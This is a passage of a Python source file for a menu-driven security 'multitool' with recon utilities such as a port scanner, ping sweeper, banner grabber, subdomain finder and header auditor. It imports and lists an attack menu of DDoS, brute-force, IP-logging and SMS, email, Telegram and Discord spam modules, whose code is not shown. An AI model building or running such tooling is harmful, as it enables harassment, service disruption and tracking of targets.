#!/usr/bin/env python3
"""
================================================================================
MAINFRAME // SEC-OPERATIONS INTERACTIVE TERMINAL MULTITOOL CORE ENGINE
================================================================================
Architecture Model : Multi-Tier Nested Subsystem Shell (Directory-Driven Layout)
Privilege Layer    : Integrated Operating System Auto-Elevation (ctypes Execution)
Dependency Profile : Standalone Production Baseline (Zero Mandatory External Pip Packages)
Verification Layer : Advanced System-Wide Subprocess Path Resolution
Logging Core       : Optimized Thread-Safe Dual-Stream Intercept Logging Engine
Visual Layer       : Cross-Platform Background Daemon Window-Title Matrix Scrambler
================================================================================
"""
# ================================================================================
class Colors:
    """
    High-visibility ANSI console formatting control strings.
    Provides standard 16-color virtual terminal attribute configurations.
    """
    RED = '\033[91m'
    AMBER = '\033[93m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    # Absolute terminal clearance code sequence:
    # \033[2J -> Erase active viewing canvas
    # \033[3J -> Fully purge scrollback cache history buffer blocks
    # \033[H  -> Reset hardware cursor context to coordinates 0,0
    CLEAR_SCREEN = '\033[2J\033[3J\033[H'
# ================================================================================
# --- NEW IMPORTS FOR BEAST BOMBER CATEGORY 5 ---
import sys
from pathlib import Path

# Add project root to path for core module imports
sys.path.insert(0, str(Path(__file__).parent))

# Initialize placeholders for optional Beast Bomber engines and UI helpers
SMSAttack = None
DDoSAttack = None
DiscordSpam = None
EmailAttack = None
TelegramAttack = None
BruteForceAttack = None
ImageLogger = None
BeastSettings = None
IMPORTS_OK = False
get_lang = None
logo_main = None
menu_ru = None
menu_en = None
logo_sms = None
logo_ddos = None
logo_email = None
logo_discord = None
logo_telegram = None
logo_bruteforce = None

# UI & Config helpers (critical for Beast Bomber menu display)
try:
    from core.etc.settings import Settings as BeastSettings
    from core.etc.functions import get_lang, logo_main, menu_ru, menu_en, \
        logo_sms, logo_ddos, logo_email, logo_discord, logo_telegram, logo_bruteforce
    try:
        from colorama import init, Fore, Style, Back
        init()
    except ImportError:
        pass

    IMPORTS_OK = True
except Exception as e:
    print(f"{Colors.RED}[!] Warning: Could not load Beast Bomber UI modules. Check 'core' folder structure.{e}{Colors.RESET}")

# Engine modules — each imported independently so a single missing dependency
# (e.g. opentele for Telegram) doesn't block all imports.
try:
    from core.sms_spam.sms import SMSAttack
except Exception:
    pass

try:
    from core.ddos_attack.ddos import DDoSAttack
except Exception:
    pass

try:
    from core.discord_spam.discord import DiscordSpam
except Exception:
    pass

try:
    from core.email_spam.email_attack import EmailAttack
except Exception:
    pass

try:
    from core.telegram_spam.telegram import TelegramAttack
except Exception:
    pass

try:
    from core.brute_force.bruteforce import BruteForceAttack
except Exception:
    pass

try:
    from core.image_logger.imagelogger import ImageLogger
except Exception:
    pass

# --- END NEW IMPORTS ---

import os
import sys
import time
import random
import base64
import json
import socket
import struct
import subprocess
import shutil
import ctypes
import threading
import hashlib
import platform
import re
import math
import webbrowser
from concurrent.futures import ThreadPoolExecutor
import urllib.request
import urllib.error

# Initialize and synchronize virtual terminal sequences across Windows environments natively
if sys.platform.startswith('win'):
    try:
        # Enable ANSI escape processing explicitly for modern cmd/powershell sandboxes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        os.system('')

class DualStreamWriter:
    """
    Thread-safe intercept standard stdout streams to simultaneously replicate console 
    outputs into local text documents while filtering out raw ANSI layout color arrays.
    """
    def __init__(self, original_stdout, log_file_handle):
        self.terminal = original_stdout
        self.log_file = log_file_handle
        self.ansi_regex = re.compile(r'\033\[[0-9;]*[a-zA-Z]')
        self.write_lock = threading.Lock()

    def write(self, message):
        with self.write_lock:
            # Deliver pristine colored output to the active screen terminal interface
            self.terminal.write(message)
            # Clean text by purging terminal manipulation and color escape blocks before saving to disk
            purified_message = self.ansi_regex.sub('', message)
            self.log_file.write(purified_message)
            self.log_file.flush()

    def flush(self):
        with self.write_lock:
            self.terminal.flush()
            self.log_file.flush()

class MainframeUI:
    """Handles the rendering engines for banners, text structures, and menu loops."""
    
    @staticmethod
    def draw_banner():
        """Renders the central system cybernetic telemetry node graphic."""
        skull_ascii = r"""
         ______
      .-"      "-.
     /            \
    |              |
    |,.  .-.  .-.  ,|
    | )(__/  \__)( |
    |/     /\     \|
    (_     ^^     _)
     \__|IIIIII|__/
      | \IIIIII/ |
      \          /
       `--------`"""
        print(f"{Colors.CYAN}{skull_ascii}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}" + "=" * 80)
        print("   MAINFRAME COMPREHENSIVE SECURITY RECONNAISSANCE ENGINE // MULTI-CORE")
        print("   DEPLOYMENT SPECIFICATION RELEASE v5.90 // COMPLETE 30-IN-1 TOOL PLATFORM")
        print("=" * 80 + f"{Colors.RESET}\n")

    @staticmethod
    def display_main_menu():
        """Prints the consolidated, clean high-level operational categories."""
        print(f"{Colors.BOLD}{Colors.GREEN}[MAIN SYSTEM DIRECTORY CORE]{Colors.RESET}\n")
        print(f"  [{Colors.AMBER}1{Colors.RESET}] Sub-Directory 01 // Network Infrastructure & Endpoint Recon Cores")
        print(f"  [{Colors.CYAN}2{Colors.RESET}] Sub-Directory 02 // External OSINT & Target Record Profilers")
        print(f"  [{Colors.GREEN}3{Colors.RESET}] Sub-Directory 03 // Local Data Traffic Monitors, Audits & Utilities")
        print(f"  [{Colors.CYAN}4{Colors.RESET}] Sub-Directory 04 // Advanced Infrastructure Audits & Integrity Cores")
        print(f"  [{Colors.RED}5{Colors.RESET}] Sub-Directory 05 // Attack Vectors & Exploit Frameworks [SHELL BASELINE]")
        print("\n" + f"{Colors.RED}[SYSTEM SHUTDOWN CONTROL]{Colors.RESET}")
        print(f"  [{Colors.RED}6{Colors.RESET}] Terminate Active Mainframe Operator Control Session")
        print(f"\n{Colors.BOLD}{Colors.GREEN}" + "-" * 80 + f"{Colors.RESET}")

    @staticmethod
    def display_network_menu():
        """Submenu for core infrastructure mapping and connectivity analysis routines."""
        print(f"{Colors.AMBER}[SUB-DIRECTORY 01 // NETWORK INFRASTRUCTURE & ENDPOINT RECON]{Colors.RESET}\n")
        print("  [1] High-Speed Rainbow Echo Pinger Latency Monitor")
        print("  [2] Reverse DNS Infrastructure Resolver (IP-to-Host PTR Check)")
        print("  [3] Multi-Threaded Target Service Port Scanner & Vulnerability Profiler")
        print("  [4] Local Subnet Parallel Ping Sweeper Matrix")
        print("  [5] Network Application Service Banner Grabber Auditor")
        print("  [6] DNS Reconnaissance Explorer Matrix (AddrInfo Lookup)")
        print("  [7] Passive Domain Subdomain Discovery Engine (via crt.sh Logs)")
        print("  [8] Advanced RDAP Registration Infrastructure Allocation Mapper")
        print("  [9] HTTP Header Security Compliance & Hardening Auditor")
        print("  [10] DNS-over-HTTPS (DoH) Client Resolver Subsystem")
        print("\n" + f"{Colors.CYAN}[NAVIGATION FRAMEWORK]{Colors.RESET}")
        print("  [11] Return to Main System Directory Core")
        print(f"\n{Colors.BOLD}{Colors.AMBER}" + "-" * 80 + f"{Colors.RESET}")

    @staticmethod
    def display_osint_menu():
        """Submenu for active profile tracking and threat directory auditing lookups."""
        print(f"{Colors.CYAN}[SUB-DIRECTORY 02 // EXTERNAL OSINT & TARGET PROFILE MANAGEMENT]{Colors.RESET}\n")
        print("  [1] Sherlock Username Account Tracer (Live Shell Subprocess Launch)")
        print("  [2] PhoneInfoga Telecom Target Scanner (Live Shell Subprocess Launch)")
        print("  [3] Holehe Email Platform Account Auditor (Live Shell Subprocess Launch)")
        print("  [4] Socialscan Concurrent Identity Profiler (Live Shell Subprocess Launch)")
        print("  [5] Live Online Data Breach Explorer & Password Leak Checker")
        print("  [6] Tor Exit Node Network Threat Intelligence Node Validator")
        print("  [7] Online IP Geolocation & Autonomous System (ASN) Metadata Explorer")
        print("  [8] IDN Homograph Phishing Domain & Punycode Analyzer")
        print("\n" + f"{Colors.AMBER}[NAVIGATION FRAMEWORK]{Colors.RESET}")
        print("  [9] Return to Main System Directory Core")
        print(f"\n{Colors.BOLD}{Colors.CYAN}" + "-" * 80 + f"{Colors.RESET}")

    @staticmethod
    def display_utilities_menu():
        """Submenu for local system logs, encryption structures, and documentation blueprints."""
        print(f"{Colors.GREEN}[SUB-DIRECTORY 03 // LOCAL DATA TRAFFIC, SECURITY AUDITS & UTILITIES]{Colors.RESET}\n")
        print("  [1] Inbound Network Packet Monitor Engine (Requires Admin Context)")
        print("  [2] Local Directory Source Code 'Secret & Private Key' Leak Scanner")
        print("  [3] Cryptographic Hash Signatures Matrix Generation & Token Analyzer")
        print("  [4] Advanced Local Host Operating System Telemetry Profiler")
        print("  [5] Base64 Cryptographic Processing Matrix (Data Transformation)")
        print("\n" + f"{Colors.CYAN}[NAVIGATION FRAMEWORK]{Colors.RESET}")
        print("  [6] Return to Main System Directory Core")
        print(f"\n{Colors.BOLD}{Colors.GREEN}" + "-" * 75 + f"{Colors.RESET}")

    @staticmethod
    def display_advanced_audits_menu():
        """Submenu for structural file integrity checks and certificate audits."""
        print(f"{Colors.CYAN}[SUB-DIRECTORY 04 // ADVANCED INFRASTRUCTURE AUDITS & INTEGRITY]{Colors.RESET}\n")
        print("  [1] Local File Integrity Monitor (FIMS Directory Snapshot Tracker)")
        print("  [2] SSL/TLS Certificate Expiration & Cipher Suite Auditor")
        print("  [3] Host Active Network Connection & Listening Port Profiler")
        print("  [4] Password Complexity & Offline Information Entropy Matrix")
        print("  [5] Local Network ARP Table Cache Profiler & Duplicate MAC Auditor")
        print("  [6] CIDR Subnet IPv4 Network Range & Mask Calculator")
        print("  [7] UPnP SSDP Local LAN Smart Device Discovery Explorer")
        print("  [8] Local Hosts File DNS Spoofing & Cache Poisoning Auditor")
        print("  [9] MAC Address OUI Vendor Directory Lookup Engine")
        print("\n" + f"{Colors.CYAN}[NAVIGATION FRAMEWORK]{Colors.RESET}")
        print("  [10] Return to Main System Directory Core")
        print(f"\n{Colors.BOLD}{Colors.CYAN}" + "-" * 80 + f"{Colors.RESET}")

    @staticmethod
    def display_attack_menu():
        """Submenu for attack vectors and exploit frameworks."""
        print(f"{Colors.RED}[SUB-DIRECTORY 05 // ATTACK VECTORS & EXPLOIT FRAMEWORKS]{Colors.RESET}\n")
        print("  [1] Beast Mode (DDoS)")
        print("  [2] Image Logger")
        print("  [3] Brute Force")
        print("  [4] SMS Spam")
        print("  [5] Email Spam")
        print("  [6] Telegram Spam")
        print("  [7] Discord Spam")
        print("\n" + f"{Colors.CYAN}[NAVIGATION FRAMEWORK]{Colors.RESET}")
        print("  [8] Return to Main System Directory Core")
        print(f"\n{Colors.BOLD}{Colors.RED}" + "-" * 80 + f"{Colors.RESET}")

def find_global_command(command_name):
    """
    Systematically combs through active system path blocks, user configurations,
    and hidden global storage paths to find standalone third-party tools.
    """
    cmd_path = shutil.which(command_name)
    if cmd_path:
        return cmd_path
        
    try:
        home_dir = os.path.expanduser('~')
        pipx_bin_dir = os.path.join(home_dir, '.local', 'bin')
        fallback_path = shutil.which(command_name, path=pipx_bin_dir)
        if fallback_path:
            return fallback_path
    except Exception:
        pass

    if os.name == 'nt':
        try:
            local_appdata = os.environ.get('LOCALAPPDATA', '')
            if local_appdata:
                pipx_local_path = os.path.join(local_appdata, 'pipx', 'shared', 'bin')
                fallback_path = shutil.which(command_name, path=pipx_local_path)
                if fallback_path:
                    return fallback_path
        except Exception:
            pass

    try:
        import site
        if hasattr(site, 'getuserbase'):
            user_base = site.getuserbase()
            if user_base:
                fallback_dir = os.path.join(user_base, 'Scripts' if os.name == 'nt' else 'bin')
                fallback_path = shutil.which(command_name, path=fallback_dir)
                if fallback_path:
                    return fallback_path
    except Exception:
        pass

    try:
        bindir = os.path.dirname(sys.executable)
        fallback_path = shutil.which(command_name, path=bindir)
        if fallback_path:
            return fallback_path
        fallback_path = shutil.which(command_name, path=os.path.join(bindir, 'Scripts'))
        if fallback_path:
            return fallback_path
    except Exception:
        pass

    return command_name

def title_scrambler_daemon():
    """
    Background worker loop that dynamically randomizes the active console window title 
    bar text with high-speed cybernetic matrix sequences natively across OS platforms.
    """
    is_windows = sys.platform.startswith('win')
    base_prefix = "MAINFRAME // MATRIX MONITOR ACTIVE // CORE NODE: "
    matrix_chars = "0123456789ABCDEFLEAKTRACKEDSECX⚡☠️"
    
    while True:
        random_hash = "".join(random.choice(matrix_chars) for _ in range(16))
        scrambled_title = f"{base_prefix}[{random_hash}]"
        
        if is_windows:
            try:
                ctypes.windll.kernel32.SetConsoleTitleW(scrambled_title)
            except Exception:
                pass
        else:
            try:
                sys.stderr.write(f"\x1b]2;{scrambled_title}\x07")
                sys.stderr.flush()
            except Exception:
                pass

# ================================================================================
# SUB-DIRECTORY 01 ENGINE ROUTINES (NETWORK CORES)
# ================================================================================

def run_pinger_engine():
    """
    Constructs real-time ICMP requests using the local system shell runtime variables.
    Includes explicit verification filters to eliminate false-positive error logs.
    """
    print(f"{Colors.CLEAR_SCREEN}{Colors.RED}[WARNING // NETWORK STREAM ENGINE DEPLOYED]{Colors.RESET}")
    target_host = input(f"{Colors.BOLD}Enter target IP address routing node [Default: 185.220.101.5]: {Colors.RESET}").strip()
    if not target_host:
        target_host = "185.220.101.5"
    
    print(f"\n{Colors.CYAN}Spawning native network shell utility. Tap Ctrl+C to trigger interrupt signal...{Colors.RESET}\n")
    time.sleep(1)

    is_windows = sys.platform.startswith('win')
    cmd_args = ['ping', '-n', '1', '-w', '1000', target_host] if is_windows else ['ping', '-c', '1', '-W', '1', target_host]

    colors_list = [Colors.RED, Colors.AMBER, Colors.GREEN, Colors.CYAN]
    idx = 0
    
    try:
        while True:
            start_time = time.time()
            process = subprocess.run(cmd_args, capture_output=True, text=True)
            duration_ms = int((time.time() - start_time) * 1000)
            
            chosen_color = colors_list[idx % len(colors_list)]
            out = process.stdout.lower()
            
            if process.returncode == 0 and ("ttl=" in out or "time=" in out) and "unreachable" not in out and "timed out" not in out:
                latency_str = ""
                if "time=" in out:
                    try:
                        parts = out.split("time=")[1].split()[0]
                        parts = ''.join(c for c in parts if c.isdigit() or c == '.')
                        latency_ms = float(parts)
                        latency_str = f"{latency_ms}ms"
                    except Exception:
                        latency_str = f"~{duration_ms}ms"
                else:
                    latency_str = f"~{duration_ms}ms"
                
                print(f"{chosen_color}{target_host} ➔ {latency_str} // ECHO_SUCCESS_ACK{Colors.RESET}")
            else:
                print(f"{Colors.RED}{target_host} ➔ TIMEOUT or DROPPED FRAME{Colors.RESET}")
            
            idx += 1
            time.sleep(0.4)
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.AMBER}[STREAM STOP SIGNAL LOGGED // CONSOLE CACHE RECOVERED]{Colors.RESET}")
        time.sleep(1.5)

def run_reverse_dns():
    """Queries active name server structures to trace IP pointer (PTR) records."""
    print(f"\n{Colors.AMBER}[MODULE 02 // REVERSE DNS INFRASTRUCTURE RESOLVER]{Colors.RESET}")
    print("Performs lookups against pointer distribution files to track host allocation layers.")
    target_ip = input("\nEnter target IP address to query: ").strip()
    if not target_ip:
        return
        
    print(f"\n{Colors.GREEN}Initiating socket gethostbyaddr handshake sequence...{Colors.RESET}")
    time.sleep(0.5)
    
    try:
        hostname, alias_list, ip_list = socket.gethostbyaddr(target_ip)
        print(f"\n{Colors.GREEN}[✓] RESOLUTION SUCCESSFUL // PTR DISCOVERED{Colors.RESET}")
        print("-" * 75)
        print(f"  ➔ Hostname   : {Colors.CYAN}{hostname}{Colors.RESET}")
        print(f"  ➔ Aliases    : {alias_list}")
        print(f"  ➔ Interfaces : {ip_list}")
    except socket.herror:
        print(f"\n{Colors.RED}[!] Host Resolution Miss: No valid reverse name pointers exist for this location.{Colors.RESET}")
    except Exception as err:
        print(f"\n{Colors.RED}[!] Network Mapping Exception Logged: {err}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nModule matrix complete. Press Enter to pull up directory layout...")

def run_port_scanner():
    """Launches rapid asynchronous connections across ports and profiles vulnerabilities/hardening vectors."""
    print(f"\n{Colors.AMBER}[MODULE 03 // MULTI-THREADED PORT SCANNER & VULNERABILITY PROFILER]{Colors.RESET}")
    target = input("Enter target domain identifier or IP node: ").strip()
    if not target:
        return
        
    print(f"\n{Colors.GREEN}Resolving lookup records against root nameservers...{Colors.RESET}")
    try:
        target_ip = socket.gethostbyname(target)
        print(f"Target Identity Bound: {Colors.CYAN}{target_ip}{Colors.RESET}\n")
    except Exception as e:
        print(f"{Colors.RED}[!] Failed to resolve server destination mapping: {e}{Colors.RESET}")
        input("\nPress Enter to return...")
        return

    # Configuration database mapping common services to audit/defense context parameters
    port_hardening_db = {
        21: ("FTP", "Plaintext credentials exchange. Audit for anonymous logins or transition to SFTP/FTPS."),
        22: ("SSH", "Secure Shell interface. Verify key-based authentication is enforced and root login is deactivated."),
        23: ("Telnet", "Highly insecure plaintext stream. Immediate deprecation recommended; transition to SSH."),
        25: ("SMTP", "Mail relay protocol. Ensure server is not operating as an open relay to prevent exploitation."),
        53: ("DNS", "Domain Name System. Audit against zone transfer exposures (AXFR) and amplification risks."),
        80: ("HTTP", "Unencrypted web platform. Enforce absolute TLS encryption redirects over port 443."),
        110: ("POP3", "Post Office Protocol. Plaintext credential exchange. Transition immediately to POP3S."),
        135: ("RPC Endpoint", "Microsoft RPC Endpoint Mapper. Often probed for environment footprinting. Restrict exposure."),
        139: ("NetBIOS", "NetBIOS Session Service. Legacy networking transport protocol. Restrict access at gateway boundary."),
        443: ("HTTPS", "Secure Web Socket. Verify modern cryptographic cipher baseline suites (TLS 1.2 / TLS 1.3) are mandatory."),
        445: ("SMB", "Microsoft Directory Sharing. Ensure message signing is required to mitigate relay threats."),
        1433: ("MSSQL", "Microsoft SQL Database engine server interface. Isolate from public ingress routes."),
        3306: ("MySQL", "Open-source SQL engine infrastructure node access point. Restrict to internal localhost paths."),
        3389: ("RDP", "Remote Desktop Gateway. Enforce Network Level Authentication (NLA) and route inside a defensive VPN."),
        8080: ("HTTP-Alt", "Alternative web application runtime proxy port. Review background system dependencies for patches."),
        8443: ("HTTPS-Alt", "Alternative secure server administration access dashboard. Restrict via strict ACL configurations.")
    }

    print(f"{Colors.BOLD}{'INTERFACE':<12}{'SERVICE':<16}{'STATUS':<12}{'DEFENSIVE PROFILING ARCHIVE'}{Colors.RESET}")
    print("-" * 110)

    print_lock = threading.Lock()

    def scan_port(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.2)
            result = s.connect_ex((target_ip, port))
            if result == 0:
                service_meta = port_hardening_db.get(port, ("unknown", "No supplementary baseline audit records compiled."))
                with print_lock:
                    print(f"{Colors.GREEN}Port {port:<8}{service_meta[0]:<16}{'OPEN':<12}{Colors.RESET}{Colors.AMBER}{service_meta[1]}{Colors.RESET}")
            s.close()
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(scan_port, sorted(port_hardening_db.keys()))

    print("-" * 110)
    input(f"\nScan operations sequence terminated. Press Enter to resume...")

def run_ping_sweeper():
    """Launches parallel ICMP echo checks across the local subnet spectrum."""
    print(f"\n{Colors.AMBER}[MODULE 04 // LOCAL SUBNET PARALLEL PING SWEEPER]{Colors.RESET}")
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        default_subnet = ".".join(local_ip.split('.')[:3])
    except Exception:
        default_subnet = "192.168.1"

    subnet = input(f"Enter target local subnet prefix [Default: {default_subnet}]: ").strip() or default_subnet
    print(f"\n{Colors.CYAN}Initializing thread pools for network matrix {subnet}.1 to {subnet}.254...{Colors.RESET}\n")
    
    is_windows = sys.platform.startswith('win')
    cmd_base = ['ping', '-n', '1', '-w', '400'] if is_windows else ['ping', '-c', '1', '-W', '1']

    print(f"{Colors.BOLD}{'IP ADDRESS':<22}{'METRIC STATUS'}{Colors.RESET}")
    print("-" * 45)

    def check_host(i):
        ip = f"{subnet}.{i}"
        try:
            if subprocess.run(cmd_base + [ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
                print(f"{Colors.GREEN}{ip:<22}[ RESPONSIVE DEVICE ONLINE ]{Colors.RESET}")
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=35) as executor:
        executor.map(check_host, range(1, 255))

    print("-" * 45)
    input(f"\nSweep operation complete. Press Enter to exit subsystem layer...")

def run_banner_grabber():
    """Intercepts server banner configurations by establishing direct TCP connections."""
    print(f"\n{Colors.AMBER}[MODULE 05 // NETWORK SERVICE BANNER GRABBER AUDITOR]{Colors.RESET}")
    target = input("Enter target server domain or address block: ").strip()
    if not target:
        return
    port_input = input("Enter operational application port (e.g., 21, 22, 80): ").strip()
    try:
        port = int(port_input)
    except ValueError:
        print(f"{Colors.RED}[!] Format Check Exception: Target port must be a numerical value.{Colors.RESET}")
        time.sleep(1.2)
        return

    print(f"\n{Colors.GREEN}Opening socket connection pipeline to {target}:{port}...{Colors.RESET}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.5)
        s.connect((target, port))
        
        if port in [80, 8080]:
            s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            
        banner = s.recv(1024)
        s.close()
        
        print(f"\n{Colors.GREEN}[✓] REMOTE DATA CAPTURED // SOFTWARE RECORD ANCHOR{Colors.RESET}\n")
        print("-" * 75)
        print(banner.decode('utf-8', errors='ignore').strip())
    except Exception as e:
        print(f"\n{Colors.RED}[!] Pipeline Dropped: Stream handshake interface rejected: {e}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nPress Enter to return to menu directory structure...")

def run_dns_recon():
    """Queries socket address descriptors to map host routing paths."""
    print(f"\n{Colors.AMBER}[MODULE 06 // DNS RECONNAISSANCE EXPLORER MATRIX]{Colors.RESET}")
    target = input("Enter target domain network path (e.g., system.com): ").strip()
    if not target:
        return

    print(f"\n{Colors.GREEN}Calling native socket infrastructure interfaces...{Colors.RESET}")
    try:
        addr_info = socket.getaddrinfo(target, None)
        resolved_records = set()
        for node in addr_info:
            resolved_records.add(node[4][0])
            
        print(f"\n{Colors.GREEN}[✓] NAME SCAN RESOLUTION INDEX{Colors.RESET}")
        print("-" * 75)
        print(f"  Target Domain Target: {target}")
        for ip in resolved_records:
            print(f"  ➔ Active Route Mapped Endpoint: {Colors.CYAN}{ip}{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Namespace Resolution Trace Failed: {e}{Colors.RESET}")

    print("-" * 75)
    input(f"\nModule run finalized. Press Enter to drop back to choices...")

def run_subdomain_finder():
    """Crawls crt.sh passively to isolate exposed subdomains without generating target alerts."""
    print(f"\n{Colors.AMBER}[MODULE 07 // PASSIVE DOMAIN SUBDOMAIN FINDER]{Colors.RESET}")
    target_root = input("\nEnter target parent root domain (e.g., corporate.com): ").strip()
    if not target_root:
        return
        
    print(f"\n{Colors.GREEN}Opening stream to transparency certificate logs database endpoint...{Colors.RESET}")
    url = f"https://crt.sh/?q={target_root}&output=json"
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
    
    try:
        with urllib.request.urlopen(req, timeout=15) as response:
            if response.status == 200:
                raw_json = response.read().decode('utf-8')
                data = json.loads(raw_json)
                isolated_subs = set()
                
                for item in data:
                    name_value = item.get('name_value', '')
                    for split_node in name_value.split('\n'):
                        split_node = split_node.strip().lower()
                        if split_node.endswith(target_root) and "*" not in split_node:
                            isolated_subs.add(split_node)
                            
                print(f"\n{Colors.GREEN}[✓] PASSIVE DISCOVERY RECON LOG INDEX ({len(isolated_subs)} ENTRIES TRACKED){Colors.RESET}")
                print("-" * 75)
                for subdomain in sorted(isolated_subs):
                    print(f"  ➔ Verified Subdomain Host: {Colors.CYAN}{subdomain}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] Server Connection Error: Server dropped protocol flag HTTP {response.status}{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] External Index Disconnected: Registry logs unreadable or stream timeout: {e}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to drop layout cache...")

def run_rdap_lookup():
    """Maps autonomous network ranges and registrar details using the global RDAP architecture."""
    print(f"\n{Colors.AMBER}[MODULE 08 // ADVANCED RDAP REGISTRATION INFRASTRUCTURE MAPPER]{Colors.RESET}")
    target_input = input("Enter target system IP address or domain path: ").strip()
    if not target_input:
        return
        
    is_raw_ip = True
    try:
        socket.inet_aton(target_input)
    except Exception:
        is_raw_ip = False
        
    if not is_raw_ip:
        print(f"{Colors.GREEN}Resolving domain target to network routing address...{Colors.RESET}")
        try:
            lookup_ip = socket.gethostbyname(target_input)
            print(f"Domain mapped to routing coordinate: {Colors.CYAN}{lookup_ip}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error tracking domain mapping: {e}. Attempting direct query format...{Colors.RESET}")
            lookup_ip = target_input
    else:
        lookup_ip = target_input

    print(f"\n{Colors.GREEN}Sending configuration request packet array to RDAP name registries...{Colors.RESET}")
    url = f"https://rdap.org/ip/{lookup_ip}"
    req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
    
    try:
        with urllib.request.urlopen(req, timeout=12) as response:
            raw_data = response.read().decode('utf-8')
            parsed_records = json.loads(raw_data)
            
            print(f"\n{Colors.GREEN}[✓] PRODUCTION INFRASTRUCTURE METRIC DATA BLOCKS{Colors.RESET}")
            print("-" * 75)
            print(f"  ➔ Primary Entity Identifier : {Colors.CYAN}{parsed_records.get('name', 'UNKNOWN')}{Colors.RESET}")
            print(f"  ➔ Assigned Allocation Block : {parsed_records.get('startAddress', 'N/A')} - {parsed_records.get('endAddress', 'N/A')}")
            print(f"  ➔ Registered Country Code   : {parsed_records.get('country', 'UNKNOWN')}")
            
            entities = parsed_records.get('entities', [])
            if entities:
                vcard = entities[0].get('vcardArray', [])
                if len(vcard) > 1:
                    for element in vcard[1]:
                        if element[0] == 'fn':
                            print(f"  ➔ Administrative Provider  : {Colors.AMBER}{element[3]}{Colors.RESET}")
    except Exception as err:
        print(f"\n{Colors.RED}[!] Registry Allocation Block Record Missing or Timeout: {err}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nModule pipeline sequence finished. Press Enter to navigate back to choices...")

def run_http_header_auditor():
    """Queries a remote server to audit security-relevant HTTP defense headers."""
    print(f"\n{Colors.AMBER}[MODULE 09 // HTTP HEADER SECURITY COMPLIANCE & HARDENING AUDITOR]{Colors.RESET}")
    target_url = input("Enter target domain or URL (e.g., example.com): ").strip()
    if not target_url:
        return
        
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "https://" + target_url
        
    print(f"\n{Colors.GREEN}Sending connection handshake request to analyze header configurations...{Colors.RESET}")
    req = urllib.request.Request(target_url, headers={'User-Agent': 'Mainframe-Terminal-Multitool-Auditor'})
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            headers = response.info()
            
            security_headers = {
                "Content-Security-Policy": "Mitigates XSS and data injection attacks by restricting trusted resource boundaries.",
                "Strict-Transport-Security": "Forces encrypted HTTPS connections, preventing man-in-the-middle decryption exploits.",
                "X-Frame-Options": "Prevents clickjacking loops by disabling webpage nesting inside unauthorized iframes.",
                "X-Content-Type-Options": "Enforces strict MIME-sniffing protection, preventing content confusion attacks.",
                "X-XSS-Protection": "Legacy cross-site scripting filter context mechanism. Often replaced by standard CSP rules."
            }
            
            print(f"\n{Colors.GREEN}[✓] SECURITY COMPLIANCE TELEMETRY REPORT{Colors.RESET}")
            print("-" * 90)
            print(f"{Colors.BOLD}{'AUDITED SECURITY HEADER':<30}{'STATUS':<15}{'CORE MITIGATION PURPOSE'}{Colors.RESET}")
            print("-" * 90)
            
            for header, purpose in security_headers.items():
                value = headers.get(header)
                if value:
                    print(f"{Colors.GREEN}{header:<30}{'PRESENT':<15}{Colors.RESET}{Colors.CYAN}{purpose}{Colors.RESET}")
                    print(f"  └─ Configured Value: {Colors.AMBER}{value}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}{header:<30}{'MISSING':<15}{Colors.RESET}{Colors.RED}{purpose}{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Failed to complete HTTP connection stream context audit: {e}{Colors.RESET}")
        
    print("-" * 90)
    input(f"\nAudit operations complete. Press Enter to load submenu options...")

def run_doh_resolver():
    """Queries Cloudflare's public DNS-over-HTTPS json registry endpoint to bypass local network pools."""
    print(f"\n{Colors.AMBER}[MODULE 10 // DNS-OVER-HTTPS (DOH) CLIENT RESOLVER SUBSYSTEM]{Colors.RESET}")
    print("Issues secure encrypted name queries over port 443 to Cloudflare public resolvers natively.")
    target_domain = input("\nEnter domain identifier to resolve (e.g., google.com): ").strip()
    if not target_domain:
        return
        
    print("Select target resource mapping record configuration tracker:")
    print(" [1] A (Standard IPv4 Address)\n [2] AAAA (Modern IPv6 Address)\n [3] MX (Mail Exchange Server Arrays)\n [4] TXT (Text Verification Nodes)")
    choice = input("Enter tracking choice (1-4): ").strip()
    record_type = {"1": "A", "2": "AAAA", "3": "MX", "4": "TXT"}.get(choice, "A")
    
    print(f"\n{Colors.GREEN}Dispatching secure encrypted HTTPS GET packet query to cloudflare-dns.com...{Colors.RESET}")
    url = f"https://cloudflare-dns.com/dns-query?name={target_domain}&type={record_type}"
    req = urllib.request.Request(url, headers={'Accept': 'application/dns-json', 'User-Agent': 'Mainframe-DoH-Core'})
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            raw_data = response.read().decode('utf-8')
            parsed_payload = json.loads(raw_data)
            
            status_code = parsed_payload.get("Status", -1)
